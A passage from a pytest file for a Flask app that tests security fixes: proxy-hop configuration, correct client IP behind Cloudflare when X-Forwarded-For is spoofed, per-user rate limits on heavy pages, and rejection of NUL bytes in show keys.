    assert c.SQLALCHEMY_ENGINE_OPTIONS["hide_parameters"] is True
    for bad in ("0", "9", "two"):
        with pytest.raises(ConfigError):
            _production_config(monkeypatch, PROXY_HOPS=bad)


def test_the_client_address_is_the_one_cloudflare_saw(monkeypatch):
    """B2: X-Forwarded-For arrives as "<client>, <cloudflare edge>" (anything the client
    sent is further left). One hop gave every visitor the edge's address."""
    from app import create_app

    prod = create_app(_production_config(monkeypatch))
    prod.add_url_rule("/_ip", "ip", lambda: request_ip())
    c = prod.test_client()
    seen = c.get("/_ip", headers={"X-Forwarded-For": "6.6.6.6, 203.0.113.9, 172.68.1.1"})
    assert seen.get_data(as_text=True) == "203.0.113.9"


def request_ip() -> str:
    from flask import request

    return request.remote_addr or ""


def test_heavy_pages_are_rate_limited_per_person(client, monkeypatch):
    """B6: dashboards and order lists had no limit; a stolen session could loop them."""
    from app import auth as auth_mod

    owner(client)
    monkeypatch.setattr(auth_mod, "HEAVY_READS_PER_MIN", 2)
    codes = [client.get("/api/dashboard").status_code for _ in range(3)]
    assert codes == [200, 200, 429]
    assert client.get("/api/inventory").status_code == 200  # light reads are not counted


def test_show_keys_with_hidden_characters_are_refused_not_a_500(client, auth):
    """B7: a NUL in the show key reached Postgres (500)."""
    from app.services.ingest import BatchInvalid, validate

    payload = batch([], show="2026-10-19T20:00:00\x00Z")
    with pytest.raises(BatchInvalid):
        validate(payload)
    assert client.get("/api/ingest/stock?show=a%00b", headers=auth).status_code == 400
    assert client.get("/api/ingest/shows/a%00b", headers=auth).status_code == 404
